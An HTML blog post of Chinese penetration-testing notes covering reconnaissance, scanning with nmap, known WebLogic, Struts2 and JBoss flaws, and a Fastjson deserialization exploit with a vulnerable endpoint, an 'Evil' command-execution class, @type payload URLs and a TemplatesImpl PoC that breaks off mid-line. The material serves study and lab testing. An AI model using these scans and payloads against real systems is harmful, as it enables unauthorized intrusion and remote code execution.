@@ -1,0 +1,623 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="前置知识                           一、信息搜集                           1.子域名        google hacking 12site:baidu.cominurl:php?id&#x3D;1 三方网站查询 123https:&#x2F;&#x2F;dnsdumpster.comhttp:&#x2F;&#x2F;tool.chinaz.com&#x2F;s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试">
+<meta property="og:url" content="http://pig-007.github.io/2022/08/14/%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="PIG-007">
+<meta property="og:description" content="前置知识                           一、信息搜集                           1.子域名        google hacking 12site:baidu.cominurl:php?id&#x3D;1 三方网站查询 123https:&#x2F;&#x2F;dnsdumpster.comhttp:&#x2F;&#x2F;tool.chinaz.com&#x2F;s">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113110028639.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113111840633.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113115127399.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113115659179.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221118112528568.png">
+<meta property="article:published_time" content="2022-08-14T05:40:30.000Z">
+<meta property="article:modified_time" content="2023-09-11T13:01:18.120Z">
+<meta property="article:author" content="PIG-007">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113110028639.png"><title>渗透测试 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2022/08/14/%E6%B8%97%E9%80%8F/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">渗透测试</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body">
+        <h1 id="前置知识"   >
+          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1>
+      
+        <h2 id="一、信息搜集"   >
+          <a href="#一、信息搜集" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h2>
+      
+        <h3 id="1-子域名"   >
+          <a href="#1-子域名" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-子域名" class="headerlink" title="1.子域名"></a>1.子域名</h3>
+      <ul>
+<li><p>google hacking</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:baidu.com</span><br><span class="line">inurl:php?id=1</span><br></pre></td></tr></table></div></figure></li>
+<li><p>三方网站查询</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://dnsdumpster.com</span><br><span class="line">http://tool.chinaz.com/subdomain</span><br><span class="line">FOFA</span><br></pre></td></tr></table></div></figure></li>
+<li><p>SSL证书查询</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://crt.sh/</span><br></pre></td></tr></table></div></figure></li>
+<li><p>JS文件发现子域名</p>
+<p>安装一下，可以使用，原理就是网站源代码下保存的各种子域名</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Threezh1/JSFinder</span><br></pre></td></tr></table></div></figure></li>
+<li><p>子域名爆破工具：……</p>
+<p>或者在线工具</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lijiejie/subDomainsBrute</span><br></pre></td></tr></table></div></figure></li>
+<li><p><strong>OneForAll</strong>：安装使用，设置API很好用</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/shmilylty/OneForAll</span><br></pre></td></tr></table></div></figure></li>
+</ul>
+
+        <h3 id="2-IP搜集"   >
+          <a href="#2-IP搜集" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-IP搜集" class="headerlink" title="2.IP搜集"></a>2.IP搜集</h3>
+      <p>有的服务开启了CDN之后，真实的服务器在北京，可是福建也存在它的服务备份，所以当我们从福建进行域名访问时，其访问到的IP就可能是在福建的IP，而不是其在北京的真实服务区的IP。所以有的时候需要绕过。</p>
+<ul>
+<li><p>多地Ping</p>
+<p>挑选最多的IP从而判断真实IP</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://ping.chinaz.com</span><br><span class="line">http://www.webkaka.com/Ping.aspx</span><br></pre></td></tr></table></div></figure></li>
+<li><p>国外服务区Ping</p>
+<p>CDN由于昂贵，一般不对国外的服务提供CDN服务，所以使用国外服务区进行Ping一般可以找到真实IP。</p>
+</li>
+<li><p>查看子域名的IP，通过Ping子域名查看</p>
+</li>
+<li><p>查询历史DNS记录</p>
+<p>由于最开始建设网站没有CDN的时候域名对应真实IP，所以拿到最开始那一段时间的可以看到真实IP</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://dnsdb.io/zh-cn</span><br><span class="line">https://securitytrails.com</span><br><span class="line">https://x.threatbook.cn/</span><br></pre></td></tr></table></div></figure></li>
+</ul>
+
+        <h3 id="3-C段存活主机探测"   >
+          <a href="#3-C段存活主机探测" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-C段存活主机探测" class="headerlink" title="3.C段存活主机探测"></a>3.C段存活主机探测</h3>
+      <ul>
+<li><p>nmap工具</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP www.xxx.com/24</span><br><span class="line">nmap -sP 192.168.1.*</span><br></pre></td></tr></table></div></figure></li>
+<li><p>其他工具：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/se55i0n/Cwebscanner</span><br></pre></td></tr></table></div></figure></li>
+<li><p>常用命令</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -v -T4 -oG Discover.gnmap 172.26.1.0/24     <span class="comment">#主机探测</span></span><br><span class="line">grep <span class="string">&quot;Status: Up&quot;</span> Discover.gnmap | cut -f 2 -d <span class="string">&#x27;&#x27;</span> &gt; LiveHosts.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#端口扫描</span></span><br><span class="line">nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#系统扫描</span></span><br><span class="line">nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#版本检测</span></span><br><span class="line">nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</span><br></pre></td></tr></table></div></figure></li>
+</ul>
+
+        <h3 id="4-其他信息搜集"   >
+          <a href="#4-其他信息搜集" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-其他信息搜集" class="headerlink" title="4.其他信息搜集"></a>4.其他信息搜集</h3>
+      <ul>
+<li><p>历史漏洞信息</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://wy.zone.ci/</span><br><span class="line">https://wooyun.kieran.top/#!/</span><br><span class="line"></span><br><span class="line">https://www.exploit-db.com/ 	#漏洞查找</span><br><span class="line"></span><br><span class="line">https://wiki.0-sec.org/#/md</span><br><span class="line"></span><br><span class="line">https://www.seebug.org/</span><br></pre></td></tr></table></div></figure></li>
+</ul>
+
+        <h2 id="二、网站信息搜集"   >
+          <a href="#二、网站信息搜集" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、网站信息搜集" class="headerlink" title="二、网站信息搜集"></a>二、网站信息搜集</h2>
+      
+        <h3 id="1-网站指纹识别"   >
+          <a href="#1-网站指纹识别" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-网站指纹识别" class="headerlink" title="1.网站指纹识别"></a>1.网站指纹识别</h3>
+      <ul>
+<li><p>操作系统</p>
+<ul>
+<li><p>ping：</p>
+<p>windows的TTL值一般为128，Linux则为64。TTL大于100一般为windows，几十一般为linux。</p>
+</li>
+<li><p>nmap -O扫描</p>
+</li>
+<li><p>windows大小写不敏感，Linux则很区分大小写</p>
+</li>
+</ul>
+</li>
+<li><p>中间件</p>
+<ul>
+<li><p>F12响应头Server字段</p>
+</li>
+<li><p>whatweb：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.whatweb.net/</span><br></pre></td></tr></table></div></figure></li>
+<li><p>wappalyzer浏览器插件</p>
+</li>
+</ul>
+</li>
+<li><p>语言识别</p>
+<ul>
+<li>PHP、ASP等等</li>
+<li>数据库类型等</li>
+</ul>
+</li>
+<li><p>CMS识别：</p>
+<p>内容管理系统，用于网站内容文章管理，常见有dedecms、Discuz、phpcms等</p>
+<ul>
+<li><p>识别工具：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://whatweb.bugscaner.com/look/</span><br><span class="line">https://github.com/iceyhexman/onlinetools</span><br></pre></td></tr></table></div></figure></li>
+</ul>
+</li>
+</ul>
+
+        <h3 id="2-敏感文件、目录探测"   >
+          <a href="#2-敏感文件、目录探测" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-敏感文件、目录探测" class="headerlink" title="2.敏感文件、目录探测"></a>2.敏感文件、目录探测</h3>
+      <p>常见有</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">github 			#直接github上搜索该网站</span><br><span class="line">.git			#GitHack自动化利用,原理是本地和远程相互备份了</span><br><span class="line">.svn</span><br><span class="line">.DS_Store  #苹果操作系统的文件</span><br><span class="line">.hg</span><br><span class="line">.bzr</span><br><span class="line">cvs</span><br><span class="line"></span><br><span class="line">WEB-INF			</span><br><span class="line">#是JAVA的WEB应用的安全目录,如果想要在页面中直接访问其中的文件,必须要通过web.xml文件对要访问的文件进行相应的映射才能访问。</span><br><span class="line"></span><br><span class="line">www.zip</span><br></pre></td></tr></table></div></figure>
+
+<ul>
+<li><p>工具</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirsearch</span><br><span class="line">御剑</span><br><span class="line">https://github.com/H4ckForJob/dirmap</span><br></pre></td></tr></table></div></figure></li>
+<li><p>针对漏洞的信息泄露</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/LandGrey/SpringBootVulExploit</span><br><span class="line">https://github.com/rabbitmask/SB-Actuator</span><br></pre></td></tr></table></div></figure></li>
+</ul>
+
+        <h3 id="3-网站WAF识别"   >
+          <a href="#3-网站WAF识别" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-网站WAF识别" class="headerlink" title="3.网站WAF识别"></a>3.网站WAF识别</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/EnableSecurity/wafw00f</span><br><span class="line">nmap -p80,443 --script http-waf-detect ip</span><br><span class="line">nmap -p80,443 --script http-waf-fingerprint ip</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h2 id="三、漏洞扫描"   >
+          <a href="#三、漏洞扫描" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、漏洞扫描" class="headerlink" title="三、漏洞扫描"></a>三、漏洞扫描</h2>
+      
+        <h3 id="1-针对性漏洞"   >
+          <a href="#1-针对性漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-针对性漏洞" class="headerlink" title="1.针对性漏洞"></a>1.针对性漏洞</h3>
+      <ul>
+<li><p>SQL：sqlmap</p>
+</li>
+<li><p>weblogic：weblogicscan</p>
+</li>
+<li><p>CMS</p>
+<ul>
+<li>wordpress：wpscan</li>
+<li>dedecms：dedecmsscan</li>
+</ul>
+</li>
+<li><p>应用层：nessus</p>
+</li>
+<li><p>某类框架：Struts2(Struts2漏洞检测工具)、sprintboot(SB-Actuator)</p>
+</li>
+<li><p>web服务：xray、awvs</p>
+</li>
+</ul>
+
+        <h3 id="2-awvs"   >
+          <a href="#2-awvs" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-awvs" class="headerlink" title="2.awvs"></a>2.awvs</h3>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113110028639.png" alt="image-20221113110028639"></p>
+
+        <h2 id="四、常见漏洞"   >
+          <a href="#四、常见漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、常见漏洞" class="headerlink" title="四、常见漏洞"></a>四、常见漏洞</h2>
+      
+        <h3 id="1-weblogic"   >
+          <a href="#1-weblogic" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-weblogic" class="headerlink" title="1.weblogic"></a>1.weblogic</h3>
+      <ul>
+<li><p>端口：7001</p>
+</li>
+<li><p>Web界面特征：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113111840633.png" alt="image-20221113111840633"></p>
+</li>
+</ul>
+
+        <h3 id="2-Thinkphp5"   >
+          <a href="#2-Thinkphp5" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Thinkphp5" class="headerlink" title="2.Thinkphp5"></a>2.Thinkphp5</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/admintony/thinkPHPBatchPoc</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="3-Struts2"   >
+          <a href="#3-Struts2" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Struts2" class="headerlink" title="3.Struts2"></a>3.Struts2</h3>
+      <ul>
+<li><p>框架识别：</p>
+<ul>
+<li><code>.do</code>或者<code>.action</code>后缀</li>
+<li><code>/struts/webconsole.html</code>界面：需要开启<code>devMode</code></li>
+</ul>
+</li>
+<li><p>工具：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/HatBoy/Struts2-Scan</span><br></pre></td></tr></table></div></figure></li>
+<li><p>常见漏洞：</p>
+<ul>
+<li><p>struts2-045：CVE-2017-5638，可代码执行，版本在2.3.5<del>2.3.31和2.5</del>2.5.10</p>
+<p>在使用基于Jakarta插件的文件上传功能时，可能存在远程命令执行。</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85674" >https://www.anquanke.com/post/id/85674</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</li>
+</ul>
+</li>
+</ul>
+
+        <h3 id="4-Jboss"   >
+          <a href="#4-Jboss" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Jboss" class="headerlink" title="4.Jboss"></a>4.Jboss</h3>
+      <p>JAVA EE应用服务器，通常与Tomcat或jetty绑定使用</p>
+<ul>
+<li><p>框架识别：</p>
+<ul>
+<li><p>8080端口：6…版本</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113115127399.png" alt="image-20221113115127399"></p>
+</li>
+<li><p>1741端口：7…版本</p>
+</li>
+</ul>
+</li>
+<li><p>工具：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/GGyao/jbossScan</span><br></pre></td></tr></table></div></figure></li>
+<li><p>常见漏洞：</p>
+<ul>
+<li><p>CVE-2017-12149</p>
+<p>JAVA反序列化错误，在过滤器没有进行检查。</p>
+<p>访问<code>/invoker/readonly</code>显示500可能存在</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221113115659179.png" alt="image-20221113115659179"></p>
+<p>可使用如下工具进行反弹shell</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/joaomatosf/jexboss</span><br></pre></td></tr></table></div></figure></li>
+</ul>
+</li>
+</ul>
+
+        <h3 id="5-Fastjson"   >
+          <a href="#5-Fastjson" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-Fastjson" class="headerlink" title="5.Fastjson"></a>5.Fastjson</h3>
+      <ul>
+<li><p>识别：</p>
+<ul>
+<li>出现json格式的地方就又可能使用了fastjson（<code>Content-type:application/json</code>）</li>
+</ul>
+</li>
+<li><p>原理：</p>
+<p>在<code>FastJson</code> 中有一个<code>@type</code> 参数，能将我们反序列化后的类转为<code>@type</code> 中指定的类，然后在反序列化过程中会自动调用类中的<code>setter</code>， <code>getter</code> 和构造器，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/rwx6sb" >FastJason 1.2.22-1.2.24 TemplatesImpl利用链分析 (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>使用<code>springboot</code>时如下</p>
+<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/fast&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">FastVuln1</span><span class="params">(<span class="meta">@RequestParam(name=&quot;evil&quot;)</span> String evil)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Object obj = JSON.parseObject(evil,Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    System.out.println(obj.getClass().getName());</span><br><span class="line">    <span class="keyword">return</span> evil;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>相关<code>Evil</code>类</p>
+<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjsondemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">this</span>.cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCmd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Evil&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cmd=&#x27;&quot;</span> + cmd + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>对应的<code>payload</code>为，记得<code>url</code>编码一下</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/fast?evil=&#123;&quot;@type&quot;:&quot;com.example.fastjsondemo.Evil&quot;,&quot;cmd&quot;:&quot;touch ccc&quot;&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>或者利用一下<code>dnslog</code></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/fast?evil=&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;je85rk.dnslog.cn&quot;&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>结合<code>JAVA</code>反序列化的知识，得到<code>POC</code></p>
+<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjsondemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Transformer;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.time.temporal.Temporal;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">generateEvil</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clas = pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        String cmd = <span class="string">&quot;Runtime.getRuntime().exec(\&quot;touch dddd\&quot;);&quot;</span>;</span><br><span class="line">        clas.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        clas.writeFile(<span class="string">&quot;./&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = clas.toBytecode();</span><br><span class="line">        String EvilCode = 